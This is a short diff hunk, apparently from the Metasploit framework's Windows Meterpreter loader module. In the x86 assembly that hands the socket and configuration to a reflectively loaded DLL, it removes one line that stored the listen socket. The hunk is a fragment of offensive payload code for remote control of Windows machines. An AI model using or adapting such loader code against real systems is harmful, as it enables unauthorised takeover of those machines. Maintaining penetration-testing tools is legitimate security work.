@@ -53,7 +53,6 @@ module Payload::Windows::MeterpreterLoader
           ; offset from ReflectiveLoader() to the end of the DLL
           add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
           mov [ebx], edi        ; write the current socket to the config
-          mov [ebx+4], esi      ; write the current listen socket to the config
           push ebx              ; push the pointer to the configuration start
           push 4                ; indicate that we have attached
           push eax              ; push some arbitrary value for hInstance
